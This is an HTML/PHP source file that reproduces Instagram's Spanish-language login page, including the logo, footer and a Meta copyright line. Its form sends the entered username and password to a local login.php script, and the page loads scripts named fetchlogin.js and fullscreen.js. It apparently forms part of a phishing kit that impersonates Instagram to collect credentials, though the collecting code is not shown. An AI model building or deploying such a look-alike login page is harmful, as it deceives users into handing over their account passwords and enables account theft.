<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Instagram">
    <meta name="author" content="cuxito">
    <link rel="shortcut icon" href="img/icon.png" type="image/x-icon">
    <link rel="stylesheet" href="css/style.css">
    <title>Instagram</title>
</head>
<body onload="SwitchScreen()">
        <section class="container">
            <!-- SMARTPHONE SECTION -->
            <article class="smartphone">
                <div class="screens">
                    <img class="screen fade" src="img/screen1.png" alt="screen1">
                    <img class="screen fade" src="img/screen2.png" alt="screen2">
                    <img class="screen fade" src="img/screen3.png" alt="screen3">
                </div>
                <img src="img/smartphones.png" alt="smartphones">
            </article>
            <!-- SMARTPHONE SECTION END -->
            <!-- FORM SECTION -->
            <article class="form-area">
                <div class="logo">
                    <img src="img/logo.png" alt="Instagram Logo">
                </div>
                <form action="./php/login.php" method="post">
                    <input type="text" name="username" id="username" placeholder="Telefono, usuario o correo electrónico" required>
                    <input type="password" name="password" id="password" placeholder="Contraseña" required>
                    <input type="submit" name="submit" value="Entrar">
                    <div class="other-option">
                        <div></div> <p>O</p> <div></div>
                    </div>
                    <div class="options">
                        <a href="#" class="social"> <span><i class="fab fa-facebook-square"></i></span> Iniciar sesión con Facebook </a>
                        <?php 
                            include_once('php/errors.php');
                        ?>
                        
                        <div class="forget"> <a href="#">¿Has olvidado la contraseña?</a> </div>
                    </div>
                </form>
                <div class="noaccount">
                    <a href="#">¿No tienes una cuenta? <span>Regístrate</span></a>
                </div>
                <div class="apps">
                    <p>Descarga la aplicación</p>
                    <a href="#"> <img src="img/appstore.png" alt="Descargar con AppStore"> </a>
                    <a href="#"> <img src="img/googleplay.png" alt="Descargar con Google Play"> </a>
                </div>
            </article>
        </section>
            <!-- FORM SECTION END -->
            <!-- FOOTER -->
        <footer>
            <div class="footer-content">
                <a href="#">Meta</a>
                <a href="#">Sobre</a>
                <a href="#">Blog</a>
                <a href="#">Carreiras</a>
                <a href="#">API</a>
                <a href="#">Privacidade</a>
                <a href="#">Termos</a>
                <a href="#">Principais contas</a>
                <a href="#">Hashtags</a>
                <a href="#">Localizações</a>
                <a href="#">Instagram Lite</a>
                <a href="#">Subir contactos y personas no usuarias</a>
            </div>
            <div class="copyright">
                <select aria-label="Cambiar idioma de visualización">
                    <option value="es">Español (España)</option>
                    <option value="pt">Português (Portugal)</option>
                    <option value="af">Afrikaans</option>
                    <option value="cs">Čeština</option>
                    <option value="da">Dansk</option>
                    <option value="de">Deutsch</option>
                    <option value="el">Ελληνικά</option>
                    <option value="en">English</option>
                    <option value="en-gb">English (UK)</option>
                    <option value="es-la">Español</option>
                    <option value="fi">Suomi</option>
                    <option value="fr">Français</option>
                    <option value="id">Bahasa Indonesia</option>
                    <option value="it">Italiano</option>
                    <option value="ja">日本語</option>
                    <option value="ko">한국어</option>
                    <option value="ms">Bahasa Melayu</option>
                    <option value="nb">Norsk</option>
                    <option value="nl">Nederlands</option>
                    <option value="pl">Polski</option>
                    <option value="pt-br">Português (Brasil)</option>
                    <option value="ru">Русский</option>
                    <option value="sv">Svenska</option>
                    <option value="th">ภาษาไทย</option>
                    <option value="tl">Filipino</option>
                    <option value="tr">Türkçe</option>
                    <option value="zh-cn">中文(简体)</option>
                    <option value="zh-tw">中文(台灣)</option>
                    <option value="bn">বাংলা</option>
                    <option value="gu">ગુજરાતી</option>
                    <option value="hi">हिन्दी</option>
                    <option value="hr">Hrvatski</option>
                    <option value="hu">Magyar</option>
                    <option value="kn">ಕನ್ನಡ</option>
                    <option value="sk">Slovenčina</option>
                    <option value="ta">தமிழ்</option>
                    <option value="te">తెలుగు</option>
                    <option value="vi">Tiếng Việt</option>
                    <option value="zh-hk">中文(香港)</option>
                    <option value="bg">Български</option>
                    <option value="ro">Română</option>
                    <option value="sr">Српски</option>
                    <option value="uk">Українська</option>
                </select>
                <span>&copy; 2022 Instagram from Meta</span>
            </div>
        </footer>
    <script src="js/app.js"></script>
    <script src="js/brands.min.js"></script>
    <script src="js/fontawesome.min.js"></script>
    <script src="js/fullscreen.js"></script>
    <script src="js/fetchlogin.js"></script>
</body>
</html>